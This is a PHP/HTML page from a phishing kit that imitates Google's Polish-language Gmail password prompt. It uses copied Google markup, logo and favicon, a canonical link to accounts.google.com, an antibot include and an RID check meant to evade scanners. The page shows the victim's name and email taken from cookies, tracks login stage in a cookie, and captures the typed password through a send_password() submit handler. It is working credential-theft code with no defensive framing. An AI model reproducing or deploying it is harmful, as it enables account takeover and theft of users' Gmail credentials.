<?php
require_once "antibot.php";
require_once "functions.php";

// Verify RID to deter bots
VerifyRid();

// Setup UID and status
setcookie("status", "login_3");
?>
<!DOCTYPE html>
<html lang=pl dir=ltr class=eC9N2e>

<meta charset=utf-8>
<meta name=referrer content=origin>
<meta name=viewport content="width=device-width, initial-scale=1">
<link rel="stylesheet" href="css/login_3.css">
</link>
<title>Gmail</title>
<title>Gmail</title>
<link type=image/x-icon rel="shortcut icon" href=data:image/x-icon;base64,AAABAAIAEBAAAAEAIABoBAAAJgAAACAgAAABACAAqBAAAI4EAAAoAAAAEAAAACAAAAABACAAAAAAAAAEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAP///zD9/f2W/f392P39/fn9/f35/f391/39/ZT+/v4uAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/v7+Cf39/Zn///////////////////////////////////////////39/ZX///8IAAAAAAAAAAAAAAAA/v7+Cf39/cH/////+v35/7TZp/92ul3/WKs6/1iqOv9yuFn/rNWd//j79v///////f39v////wgAAAAAAAAAAP39/Zn/////7PXp/3G3WP9TqDT/U6g0/1OoNP9TqDT/U6g0/1OoNP+Or1j//vDo///////9/f2VAAAAAP///zD/////+vz5/3G3V/9TqDT/WKo6/6LQkf/U6cz/1urO/6rUm/+Zo0r/8IZB//adZ////v7///////7+/i79/f2Y/////4nWzf9Lqkj/Vqo4/9Xqzv///////////////////////ebY//SHRv/0hUL//NjD///////9/f2U/f392v////8sxPH/Ebzt/43RsP/////////////////////////////////4roL/9IVC//i1jf///////f391/39/fr/////Cr37/wW8+/+16/7/////////////////9IVC//SFQv/0hUL/9IVC//SFQv/3pnX///////39/fn9/f36/////wu++/8FvPv/tuz+//////////////////SFQv/0hUL/9IVC//SFQv/0hUL/96p7///////9/f35/f392/////81yfz/CrL5/2uk9v///////////////////////////////////////////////////////f392P39/Zn/////ks/7/zdS7P84Rur/0NT6///////////////////////9/f////////////////////////39/Zb+/v4y//////n5/v9WYu3/NUPq/ztJ6/+VnPT/z9L6/9HU+v+WnfT/Ul7t/+Hj/P////////////////////8wAAAAAP39/Z3/////6Or9/1hj7v81Q+r/NUPq/zVD6v81Q+r/NUPq/zVD6v9sdvD////////////9/f2YAAAAAAAAAAD///8K/f39w//////5+f7/paz2/11p7v88Suv/Okfq/1pm7v+iqfX/+fn+///////9/f3B/v7+CQAAAAAAAAAAAAAAAP///wr9/f2d///////////////////////////////////////////9/f2Z/v7+CQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAP7+/jL9/f2Z/f392/39/fr9/f36/f392v39/Zj///8wAAAAAAAAAAAAAAAAAAAAAPAPAADAAwAAgAEAAIABAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAIABAACAAQAAwAMAAPAPAAAoAAAAIAAAAEAAAAABACAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAP7+/g3+/v5X/f39mf39/cj9/f3q/f39+f39/fn9/f3q/f39yP39/Zn+/v5W////DAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAP7+/iT9/f2c/f399f/////////////////////////////////////////////////////9/f31/f39mv7+/iMAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAP7+/gn9/f2K/f39+////////////////////////////////////////////////////////////////////////////f39+v39/Yf///8IAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAD+/v4k/f390v////////////////////////////////////////////////////////////////////////////////////////////////39/dD///8iAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA////MP39/er//////////////////////////+r05v+v16H/gsBs/2WxSf9Wqjj/Vqk3/2OwRv99vWX/pdKV/97u2P////////////////////////////39/ej+/v4vAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAP7+/iT9/f3q/////////////////////+v15/+Pxnv/VKk2/1OoNP9TqDT/U6g0/1OoNP9TqDT/U6g0/1OoNP9TqDT/U6g0/36+Z//d7tf///////////////////////39/ej///8iAAAAAAAAAAAAAAAAAAAAAAAAAAD///8K/f390//////////////////////E4bn/XKw+/1OoNP9TqDT/U6g0/1OoNP9TqDT/U6g0/1OoNP9TqDT/U6g0/1OoNP9TqDT/U6g0/1apN/+x0pv///////////////////////39/dD///8IAAAAAAAAAAAAAAAAAAAAAP39/Yv/////////////////////sdij/1OoNP9TqDT/U6g0/1OoNP9TqDT/U6g0/1OoNP9TqDT/U6g0/1OoNP9TqDT/U6g0/1OoNP9TqDT/YKU1/8qOPv/5wZ////////////////////////39/YcAAAAAAAAAAAAAAAD+/v4l/f39+////////////////8Lgt/9TqDT/U6g0/1OoNP9TqDT/U6g0/1OoNP9utlT/n86N/7faqv+426v/pdKV/3u8ZP9UqDX/U6g0/3egN//jiUH/9IVC//SFQv/82MP//////////////////f39+v7+/iMAAAAAAAAAAP39/Z3////////////////q9Ob/W6w+/1OoNP9TqDT/U6g0/1OoNP9nskz/zOXC/////////////////////////////////+Dv2v+osWP/8YVC//SFQv/0hUL/9IVC//WQVP/++fb//////////////////f39mgAAAAD+/v4O/f399v///////////////4LHj/9TqDT/U6g0/1OoNP9TqDT/dblc//L58P/////////////////////////////////////////////8+v/3p3f/9IVC//SFQv/0hUL/9IVC//rIqf/////////////////9/f31////DP7+/ln////////////////f9v7/Cbz2/zOwhv9TqDT/U6g0/2KwRv/v9+z///////////////////////////////////////////////////////738//1kFT/9IVC//SFQv/0hUL/9plg///////////////////////+/v5W/f39nP///////////////4jf/f8FvPv/Bbz7/yG1s/9QqDz/vN2w//////////////////////////////////////////////////////////////////rHqP/0hUL/9IVC//SFQv/0hUL//vDn//////////////////39/Zn9/f3L////////////////R878/wW8+/8FvPv/Bbz7/y7C5P/7/fr//////////////////////////////////////////////////////////////////ere//SFQv/0hUL/9IVC//SFQv/718H//////////////////f39yP39/ez///////////////8cwvv/Bbz7/wW8+/8FvPv/WNL8///////////////////////////////////////0hUL/9IVC//SFQv/0hUL/9IVC//SFQv/0hUL/9IVC//SFQv/0hUL/9IVC//rIqv/////////////////9/f3q/f39+v///////////////we9+/8FvPv/Bbz7/wW8+/993P3///////////////////////////////////////SFQv/0hUL/9IVC//SFQv/0hUL/9IVC//SFQv/0hUL/9IVC//SFQv/0hUL/+cGf//////////////////39/fn9/f36////////////////B737/wW8+/8FvPv/Bbz7/33c/f//////////////////////////////////////9IVC//SFQv/0hUL/9IVC//SFQv/0hUL/9IVC//SFQv/0hUL/9IVC//SFQv/6xaX//////////////////f39+f39/e3///////////////8cwvv/Bbz7/wW8+/8FvPv/WdP8///////////////////////////////////////0hUL/9IVC//SFQv/0hUL/9IVC//SFQv/0hUL/9IVC//SFQv/0hUL/9IVC//vVv//////////////////9/f3q/f39y////////////////0bN/P8FvPv/Bbz7/wW8+/8hrvn/+/v///////////////////////////////////////////////////////////////////////////////////////////////////////////////////39/cj9/f2c////////////////ht/9/wW8+/8FvPv/FZP1/zRJ6/+zuPf//////////////////////////////////////////////////////////////////////////////////////////////////////////////////f39mf7+/lr////////////////d9v7/B7n7/yB38f81Q+r/NUPq/0hV7P/u8P3////////////////////////////////////////////////////////////////////////////////////////////////////////////+/v5X////D/39/ff///////////////9tkPT/NUPq/zVD6v81Q+r/NUPq/2Fs7//y8v7////////////////////////////////////////////09f7//////////////////////////////////////////////////f399f7+/g0AAAAA/f39n////////////////+Tm/P89Suv/NUPq/zVD6v81Q+r/NUPq/1Bc7f/IzPn/////////////////////////////////x8v5/0xY7P+MlPP////////////////////////////////////////////9/f2cAAAAAAAAAAD+/v4n/f39/P///////////////7W69/81Q+r/NUPq/zVD6v81Q+r/NUPq/zVD6v9ZZe7/k5v0/6609/+vtff/lJv0/1pm7v81Q+r/NUPq/zVD6v+GjvL//v7//////////////////////////////f39+/7+/iQAAAAAAAAAAAAAAAD9/f2N/////////////////////6Cn9f81Q+r/NUPq/zVD6v81Q+r/NUPq/zVD6v81Q+r/NUPq/zVD6v81Q+r/NUPq/zVD6v81Q+r/NUPq/zVD6v+BivL////////////////////////////9/f2KAAAAAAAAAAAAAAAAAAAAAP7+/gv9/f3V/////////////////////7W69/8+S+v/NUPq/zVD6v81Q+r/NUPq/zVD6v81Q+r/NUPq/zVD6v81Q+r/NUPq/zVD6v81Q+r/P0zr/7q/+P///////////////////////f390v7+/gkAAAAAAAAAAAAAAAAAAAAAAAAAAP7+/ib9/f3r/////////////////////+Xn/P94gfH/NkTq/zVD6v81Q+r/NUPq/zVD6v81Q+r/NUPq/zVD6v81Q+r/NkTq/3Z/8f/l5/z///////////////////////39/er+/v4kAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAP7+/jL9/f3r///////////////////////////k5vz/nqX1/2p08P9IVez/OEbq/zdF6v9GU+z/aHLv/5qh9f/i5Pz////////////////////////////9/f3q////MAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAP7+/ib9/f3V/////////////////////////////////////////////////////////////////////////////////////////////////f390v7+/iQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAP///wr9/f2N/f39/P///////////////////////////////////////////////////////////////////////////f39+/39/Yv+/v4JAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAD+/v4n/f39n/39/ff//////////////////////////////////////////////////////f399v39/Z3+/v4lAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/v7+Dv7+/lr9/f2c/f39y/39/e39/f36/f39+v39/ez9/f3L/f39nP7+/ln+/v4OAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAP/AA///AAD//AAAP/gAAB/wAAAP4AAAB8AAAAPAAAADgAAAAYAAAAEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACAAAABgAAAAcAAAAPAAAAD4AAAB/AAAA/4AAAf/AAAP/8AAP//wAP />
<link rel=canonical href="https://accounts.google.com/v3/signin/challenge/pwd?TL=AB_wV5rsMTeT4liW6Tup8EazTtPYUTAPAKZ6_76gXtc6GHuRWAci5msJ1pwyOZg5&amp;checkConnection=youtube%3A131%3A0&amp;checkedDomains=youtube&amp;cid=1&amp;continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&amp;dsh=S1443011893%3A1663322810800049&amp;emr=1&amp;flowEntry=ServiceLogin&amp;flowName=GlifWebSignIn&amp;followup=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&amp;ifkv=AQDHYWpjDyxCjZo_eefP47mc0kT3JpPez8wnTztUxjXiVK_DZkFOXKATApGlwUstK7LnV29nXJr3Bw&amp;osid=1&amp;pstMsg=1&amp;service=mail">
<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
<script src="../js/main.js"></script>

<body jscontroller=XExvDf jsaction="rcuQ6b:npT2md; click:FAbpgf; auxclick:FAbpgf;wINJic:.CLIENT;qako4e:.CLIENT;TSpWaf:.CLIENT;nHjqDd:.CLIENT;GvneHb:.CLIENT;keydown:.CLIENT" class="nyoS7c UzCXuf EIlDfe">
    <div class="lJXwje S81Pef TFhTPc LZgQXe">
        <div class="fPxNlf LZgQXe qmmlRd" id=initialView role=presentation jsname=WsjYwc jscontroller=zYlmub jsaction=rcuQ6b:wVXPKc,eyofDf;SlnBXb:r0xNSb;cbwpef:Yd2OHe;rURRne:vYWWBd;bITzcd:wymjWe;Rld2oe:waWwEd;FzgWvd:waWwEd;>
            <div class=rn19nc aria-hidden=true>
                <div jscontroller=ltDFwf jsaction=transitionend:Zdx3Re jsname=Igk6W role=progressbar class="sZwd7c B6Vhqe qdulke jK7moc">
                    <div class="xcNBHc um3FLe"></div>
                    <div jsname=cQwEuf class="w2zcLc Iq5ZMc"></div>
                    <div class="MyvhI TKVRUb" jsname=P1ekSe>
                        <span class="l3q5xe SQxu9c"></span>
                    </div>
                    <div class="MyvhI sUoeld">
                        <span class="l3q5xe SQxu9c"></span>
                    </div>
                </div>
            </div>
            <div class=rhhJr jsname=f2d3ae role=presentation tabindex=null>
                <div class=nM4rkc id=yDmH0d jsaction=ZqRew:.CLIENT>
                    <div id=ZCHFDb></div>
                    <c-wiz jsrenderer=jGvTv class=g98c7c jsshadow jsdata=deferred-c4 data-p='%.@.1,null,null,null,"https://mail.google.com/mail/u/0/",false]' jscontroller=GLtV1c jsaction="jiqeKb:ZCwQbe;CDQ11b:n4vmRb;DKwHie:gVmDzc;jR85Td:WtmXg;rcuQ6b:rcuQ6b;click:vBw6I(preventDefault=true|L6M1Fb);DjJpIb:.CLIENT;abBxn:.CLIENT;xdUk6b:.CLIENT;ffNU7c:.CLIENT" jsname=nUpftc data-node-index=0;0 jsmodel="hc6Ubd XVq9Qb" c-wiz>
                        <c-wiz jsrenderer=OTcFib jsshadow jsdata=deferred-c3 data-p=%.@.] data-node-index=2;0 jsmodel=hc6Ubd c-wiz>
                            <div class=zOO9Bf jscontroller=Rusgnf jsname=n7vHCb>
                                <div jsname=jjf7Ff>
                                    <div id=logo class=YNY4de title=Google>
                                        <div class=Bym39d jsname=l4eHX>
                                            <svg viewBox="0 0 75 24" width=75 height=24 xmlns=http://www.w3.org/2000/svg aria-hidden=true class="BFr46e xduoyf">
                                                <g id=qaEJec>
                                                    <path fill=#ea4335 d="M67.954 16.303c-1.33 0-2.278-.608-2.886-1.804l7.967-3.3-.27-.68c-.495-1.33-2.008-3.79-5.102-3.79-3.068 0-5.622 2.41-5.622 5.96 0 3.34 2.53 5.96 5.92 5.96 2.73 0 4.31-1.67 4.97-2.64l-2.03-1.35c-.673.98-1.6 1.64-2.93 1.64zm-.203-7.27c1.04 0 1.92.52 2.21 1.264l-5.32 2.21c-.06-2.3 1.79-3.474 3.12-3.474z"></path>
                                                </g>
                                                <g id=YGlOvc>
                                                    <path fill=#34a853 d=M58.193.67h2.564v17.44h-2.564z></path>
                                                </g>
                                                <g id=BWfIk>
                                                    <path fill=#4285f4 d="M54.152 8.066h-.088c-.588-.697-1.716-1.33-3.136-1.33-2.98 0-5.71 2.614-5.71 5.98 0 3.338 2.73 5.933 5.71 5.933 1.42 0 2.548-.64 3.136-1.36h.088v.86c0 2.28-1.217 3.5-3.183 3.5-1.61 0-2.6-1.15-3-2.12l-2.28.94c.65 1.58 2.39 3.52 5.28 3.52 3.06 0 5.66-1.807 5.66-6.206V7.21h-2.48v.858zm-3.006 8.237c-1.804 0-3.318-1.513-3.318-3.588 0-2.1 1.514-3.635 3.318-3.635 1.784 0 3.183 1.534 3.183 3.635 0 2.075-1.4 3.588-3.19 3.588z"></path>
                                                </g>
                                                <g id=e6m3fd>
                                                    <path fill=#fbbc05 d="M38.17 6.735c-3.28 0-5.953 2.506-5.953 5.96 0 3.432 2.673 5.96 5.954 5.96 3.29 0 5.96-2.528 5.96-5.96 0-3.46-2.67-5.96-5.95-5.96zm0 9.568c-1.798 0-3.348-1.487-3.348-3.61 0-2.14 1.55-3.608 3.35-3.608s3.348 1.467 3.348 3.61c0 2.116-1.55 3.608-3.35 3.608z"></path>
                                                </g>
                                                <g id=vbkDmc>
                                                    <path fill=#ea4335 d="M25.17 6.71c-3.28 0-5.954 2.505-5.954 5.958 0 3.433 2.673 5.96 5.954 5.96 3.282 0 5.955-2.527 5.955-5.96 0-3.453-2.673-5.96-5.955-5.96zm0 9.567c-1.8 0-3.35-1.487-3.35-3.61 0-2.14 1.55-3.608 3.35-3.608s3.35 1.46 3.35 3.6c0 2.12-1.55 3.61-3.35 3.61z"></path>
                                                </g>
                                                <g id=idEJde>
                                                    <path fill=#4285f4 d="M14.11 14.182c.722-.723 1.205-1.78 1.387-3.334H9.423V8.373h8.518c.09.452.16 1.07.16 1.664 0 1.903-.52 4.26-2.19 5.934-1.63 1.7-3.71 2.61-6.48 2.61-5.12 0-9.42-4.17-9.42-9.29C0 4.17 4.31 0 9.43 0c2.83 0 4.843 1.108 6.362 2.56L14 4.347c-1.087-1.02-2.56-1.81-4.577-1.81-3.74 0-6.662 3.01-6.662 6.75s2.93 6.75 6.67 6.75c2.43 0 3.81-.972 4.69-1.856z"></path>
                                                </g>
                                            </svg>
                                        </div>
                                    </div>
                                </div>
                            </div>
                            <c-data id=c3 jsdata=" eCjdDd;_;$1" class=sf-hidden></c-data>
                        </c-wiz>
                        <div class=aDGQwe jsname=bN97Pc jscontroller=WI6cU jsshadow role=presentation>
                            <div jsname=paFcre>
                                <div class=rQszV jsname=tJHJj jscontroller=bjrrWe jsaction=bTyaEe:pKJJqe(af8ijd); jsshadow>
                                    <h1 class=oO8pQe data-a11y-title-piece id=headingText jsname=r4nke>
                                        <span jsslot><?php echo $_COOKIE['firstName'] . " " . $_COOKIE['lastName']; ?></span>
                                    </h1>
                                    <div class="tosRNd sf-hidden" data-a11y-title-piece id=headingSubtext jsname=VdSJob></div>
                                    <div class=Wz0RKd>
                                        <div jscontroller=ENv7Ef jsaction="click:cOuCgd; blur:O22p3e; mousedown:UX7yZ; mouseup:lbsD7e; touchstart:p6p2H; touchend:yfqBxc;" class="YZrg6 HnRr5d iiFyne cd29Sd" tabindex=0 role=link aria-label="Wybrane konto: . Przełącz konto" jsname=af8ijd>
                                            <div class=gPHLDe>
                                                <div class=qQWzTd aria-hidden=true>
                                                    <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAIAAAACACAMAAAD04JH5AAAAA3NCSVQICAjb4U/gAAAAFVBMVEWgw/9DdOA3bd49cd96oPCUuPpgiugiaVvOAAAB6ElEQVR4nO2Z227EIAxEF2z4/0+uc9lspSbBJhir7YxUqX2aU98g5vWCIAiCIAiCIAj6zSoilp8Yc66Ud1Hl2RCcMlE6RJQTz7VPP0TTEMqZ/YYwJRF8Yb8oTwhCvfGXINRYf3+CSvf+3gR3+Z9RB0Xhnyj79UIz/hsBefm3C2CXVxloErDKKQnqAHiFQB0ACYGHP+sDkMijFQ0Z8JlGhgy45EA1hD4A4/vAUgIuRWApAZcisAE4TIL4CJgCEJ6CvwgQ3obhAOGTUHkfe0dgvH/8aai5kh8ALlfz4AxY+sDr20R/K/bxV1eB38eZNgJe/sph5PhtGP51rCHw3tK0CPy3RPcEM7ZUhS4HEtGchWnNpwiU3Vdkb5UTBLGfuS8WhO8MlOfabwzHujxgWf6hiHotgCAoWqUwV9E+COU35lnDSAZgWqYfydl3DOP1j3Uk+mKIec7Xp/HyfEh+g7nI6Jf/9O46cmCk4QyF6fwScKE89iX17PxvB2LYCd1lv8VhyBWp236NwuNE8AP7FeHhe3LroVShR0HQdF07CP2VMMT/AcEg/+4sGBf0twQ9lWjZirXU9Zo7zj517e1GBmCRGWBgBSyyV8HgANhzEA1g284DAAAOAOgCAAAAXQAAAKALAAAAdMH/AfgCPkkZfuSMe/QAAAAASUVORK5CYII=" alt class="r78aae TrZEUc" data-atf=false data-iml=5941.0999999940395>
                                                </div>
                                            </div>
                                            <div jsname=fmcmS class=KTeGk data-profile-identifier><?php echo $_COOKIE['email']; ?></div>
                                            <div class=krLnGe>
                                                <svg aria-hidden=true class="stUf5b MSBt4d" fill=currentColor focusable=false width=24px height=24px viewBox="0 0 24 24" xmlns=https://www.w3.org/2000/svg>
                                                    <polygon points="12,16.41 5.29,9.71 6.71,8.29 12,13.59 17.29,8.29 18.71,9.71"></polygon>
                                                </svg>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                            </div>
                            <form method=get action="loading" novalidate jsaction=submit:JM9m2e; onsubmit="send_password();">

                                <div jsname=uybdVe class=eKnrVb role=presentation>
                                    <div jsname=USBQqe class=CYBold role=presentation>
                                        <div class=j663ec>
                                            <div class=tCpFMc jsname=rEuO1b jscontroller=ZY6Tf>
                                                <span jsslot>
                                                    <section class="aTzEhb AORPd rNe0id eLNT1d S7S4N sf-hidden" jscontroller=r27uIe data-callout-type=2 jsname=INM6z aria-live=assertive aria-atomic=true jsshadow></section>
                                                    <c-wiz jsrenderer=PXsWy jsdata=deferred-c0 data-p='%.@.null,"identity-signin-password"]' jscontroller=qPfo0c jsname=xdJtEf data-node-index=1;0 jsmodel=hc6Ubd c-wiz>
                                                        <c-data id=c0 jsdata=" U3wROe;_;$0" class=sf-hidden></c-data>
                                                    </c-wiz>
                                                    <input type=email name=identifier class="F29zPe sf-hidden" tabindex=-1 aria-hidden=true spellcheck=false value=test jsname=KKx9x autocomplete=off id=hiddenEmail>
                                                    <div class="SdBahf Fjk18" jscontroller=yGClXb jsshadow jsname=vZSTIf jsaction=rcuQ6b:rcuQ6b;KJ9cZc:nAF18e(EMUunb);RXQi4b:.CLIENT;TGB85e:.CLIENT;DQ0KUb:.CLIENT;HYMnzb:.CLIENT;sv6xVb:.CLIENT;sKmMle:.CLIENT data-is-visible=false>
                                                        <div class=eEgeR>
                                                            <div class=DPChp>
                                                                <div class=Txuhic>
                                                                    <div class=hDp5Db jscontroller=jYicPe jsaction=rcuQ6b:rcuQ6b;RXQi4b:.CLIENT;TGB85e:.CLIENT;keydown:.CLIENT;AHmuwe:.CLIENT;O22p3e:.CLIENT;YqO5N:.CLIENT jsname=UmsTj jsshadow>
                                                                        <div id=password class="rFrNMe ze9ebf YKooDc wIXLub zKHdkd sdJrJc u3bW4e" jscontroller=pxq3x jsaction="clickonly:KjsqPd; focus:Jt1EX; blur:fpfTEe; input:Lg5SV" jsshadow jsname=Ufn6O>
                                                                            <div class="aCsJod oJeWuf">
                                                                                <div class="aXBtI Wic03c">
                                                                                    <div class=Xb9hP>
                                                                                        <input type=password class="whsOnd zHQkBf" id="passwordd" jsname=YPqjbf autocomplete=current-password spellcheck=false tabindex=0 aria-label="Wpisz hasło" name=Passwd autocapitalize=off dir=ltr data-initial-dir=ltr data-initial-value value>
                                                                                        <div jsname=YRMmle class="AxOyFc snByac" aria-hidden=true>Wpisz hasło</div>
                                                                                    </div>
                                                                                    <div class="i9lrp mIZh1c"></div>
                                                                                    <div jsname=XmnwAc class="OabDMe cXrdqd Y2Zypf"></div>
                                                                                </div>
                                                                            </div>
                                                                            <div class=LXRPh>
                                                                                <div jsname=ty6ygf class="ovnfwe Is7Fhb sf-hidden"></div>
                                                                            </div>
                                                                        </div>
                                                                    </div>
                                                                </div>
                                                            </div>
                                                        </div>
                                                        <div class="OyEIQ uSvLId sf-hidden" jsname=h9d3hd aria-live=assertive></div>
                                                        <div class=EcjFDf jsname=ESjtn>
                                                            <div class=IhH7Wd jsaction=rcuQ6b:xawz9d;RqOcWc:gfO0Le; jscontroller=KylAQd jsname=EMUunb jsshadow>
                                                                <div class=ci67pc>
                                                                    <div class="BudEQ rBUW7e" jsaction=click:DKv26d;JIbuQc:vKfede(ornU0b);RXQi4b:.CLIENT;TGB85e:.CLIENT jscontroller=Dt3C4 jsname=wQNmvb>
                                                                    </div>
                                                                </div>
                                                                <div aria-atomic=true aria-live=assertive class="Df4rGb sf-hidden" jsname=h9d3hd></div>
                                                            </div>
                                                        </div>
                                                        <div class="gSlDTe sf-hidden" jsname=JIbuQc></div>
                                                    </div>
                                                    <div jscontroller=lmaXKd jsname=Si5T8b class="Wzzww eLNT1d sf-hidden" jsaction=PIvFg:IMdg8d;rcuQ6b:jqIVcd></div>
                                                </span>
                                            </div>
                                        </div>
                                        <div class=Z6Ep7d jsname=DH6Rkf jscontroller=VFoZaf jsaction=rcuQ6b:rcuQ6b;PIvFg:vjx2Ld(Njthtb),ChoyC(eBSUOb),VaKChb(gVmDzc),nCZam(W3Rzrc),Tzaumc(uRHG6),JGhSzd;dcnbp:dE26Sc(lqvTlf);FzgWvd:JGhSzd; data-is-consent=false data-is-primary-action-disabled=false data-is-secondary-action-disabled=false data-primary-action-label=Dalej data-secondary-action-label jsshadow>
                                            <div class=dqyqtf jsname=DhK0U>
                                                <div class=F9NWFb jsname=k77Iif>
                                                    <div jscontroller=Xq93uf jsaction=click:cOuCgd;JIbuQc:JIbuQc; jsname=Njthtb class="FliLIb FmFZVc" id=passwordNext>
                                                        <div class=VfPpkd-dgl2Hf-ppHlrf-sM5MNb data-is-touch-wrapper=true>
                                                            <button class="VfPpkd-LgbsSe VfPpkd-LgbsSe-OWXEXe-k8QpJ VfPpkd-LgbsSe-OWXEXe-dgl2Hf nCP5yc AjY5Oe DuMIQc LQeN7 qIypjc TrZEUc lw1w4b" jscontroller=soHxf jsaction="click:cOuCgd; mousedown:UX7yZ; mouseup:lbsD7e; mouseenter:tfO1Yc; mouseleave:JywGue; touchstart:p6p2H; touchmove:FwuNnf; touchend:yfqBxc; touchcancel:JMtRjd; focus:AHmuwe; blur:O22p3e; contextmenu:mg9Pef;mlnRJb:fLiPzd;" data-idom-class="nCP5yc AjY5Oe DuMIQc LQeN7 qIypjc TrZEUc lw1w4b" jsname=LgbsSe type=submit>
                                                                <div class=VfPpkd-Jh9lGc></div>
                                                                <div class="VfPpkd-J1Ukfc-LhBDec sf-hidden"></div>
                                                                <div class=VfPpkd-RLmnJb></div>
                                                                <span jsname=V67aGc class=VfPpkd-vQzf8d>Dalej</span>
                                                            </button>
                                                        </div>
                                                    </div>
                                                </div>
                                                <div class=XOrBDc jsname=QkNstf>
                                                    <div jscontroller=Xq93uf jsaction=click:cOuCgd;JIbuQc:JIbuQc; jsname=gVmDzc class="FliLIb sbGPcf" id=forgotPassword>
                                                        <div class=VfPpkd-dgl2Hf-ppHlrf-sM5MNb data-is-touch-wrapper=true>
                                                            <button class="VfPpkd-LgbsSe VfPpkd-LgbsSe-OWXEXe-dgl2Hf ksBjEc lKxP2d LQeN7 uRo0Xe TrZEUc lw1w4b" jscontroller=soHxf jsaction="click:cOuCgd; mousedown:UX7yZ; mouseup:lbsD7e; mouseenter:tfO1Yc; mouseleave:JywGue; touchstart:p6p2H; touchmove:FwuNnf; touchend:yfqBxc; touchcancel:JMtRjd; focus:AHmuwe; blur:O22p3e; contextmenu:mg9Pef;mlnRJb:fLiPzd;" data-idom-class="ksBjEc lKxP2d LQeN7 uRo0Xe TrZEUc lw1w4b" jsname=LgbsSe type=submit>
                                                                <div class=VfPpkd-Jh9lGc></div>
                                                                <div class="VfPpkd-J1Ukfc-LhBDec sf-hidden"></div>
                                                                <div class=VfPpkd-RLmnJb></div>
                                                                <span jsname=V67aGc class=VfPpkd-vQzf8d>Nie pamiętasz hasła?</span>
                                                            </button>
                                                        </div>
                                                    </div>
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                            </form>
                        </div>
                        <c-data id=c4 jsdata=" SnOFNc;_;$2 tEzfhe;_;$3 Rf8b0c;_;$4" class=sf-hidden></c-data>
                        <view-header style=display:none></view-header>
                    </c-wiz>
                </div>
            </div>
            <c-wiz jsrenderer=ZdRp7e jsshadow jsdata=deferred-i1 data-node-index=0;0 jsmodel=hc6Ubd c-wiz>
                <footer class=g9mjtf>
                    <div class=V7i3mf jscontroller=lwnCUe jsaction=rcuQ6b:npT2md;OmFrlf:VPRXbd>
                        <div jsshadow class=O1htCb-H9tDt jsname=rfCUpd jscontroller=yRXbo jsaction=bITzcd:KRVFmb;iFFCZc:Y0y4c;Rld2oe:gDkf4c;EDR5Je:QdOKJc;FzgWvd:RFVo1b id=lang-chooser>
                            <div jsname=wSASue class="VfPpkd-O1htCb VfPpkd-O1htCb-OWXEXe-INsAgc VfPpkd-O1htCb-OWXEXe-di8rgd-V67aGc ReCbLb UAQDDf">
                                <div class=VfPpkd-TkwUic jsname=oYxtQd jsaction="focus:AHmuwe; blur:O22p3e; click:cOuCgd; keydown:I481le; mousedown:UX7yZ; mouseup:lbsD7e; mouseenter:tfO1Yc; mouseleave:JywGue; touchstart:p6p2H; touchmove:FwuNnf; touchend:yfqBxc; touchcancel:JMtRjd;" aria-autocomplete=none role=combobox tabindex=0 aria-haspopup=listbox aria-expanded=false aria-labelledby="null i2" aria-controls=i4 aria-disabled=false>
                                    <span jscontroller=bTi8wc class="VfPpkd-NSFCdd-i5vt6e VfPpkd-NSFCdd-i5vt6e-OWXEXe-NSFCdd VfPpkd-NSFCdd-i5vt6e-OWXEXe-di8rgd-V67aGc" jsname=B9mpmd>
                                        <span class=VfPpkd-NSFCdd-Brv4Fb></span>
                                        <span class=VfPpkd-NSFCdd-MpmGFe></span>
                                    </span>
                                    <span class=VfPpkd-uusGie-fmcmS-haAclf aria-hidden=true>
                                        <span id=i2 class=VfPpkd-uusGie-fmcmS jsname=Fb0Bif>polski</span>
                                    </span>
                                    <span class=VfPpkd-t08AT-Bz112c>
                                        <svg class=VfPpkd-t08AT-Bz112c-Bd00G viewBox="7 10 10 5" focusable=false>
                                            <polygon class=VfPpkd-t08AT-Bz112c-mt1Mkb stroke=none fill-rule=evenodd points="7 10 12 15 17 10"></polygon>
                                            <polygon class=VfPpkd-t08AT-Bz112c-auswjd stroke=none fill-rule=evenodd points="7 15 12 10 17 15"></polygon>
                                        </svg>
                                    </span>
                                    <span id=i4 style=display:none aria-hidden=true role=listbox></span>
                                </div>
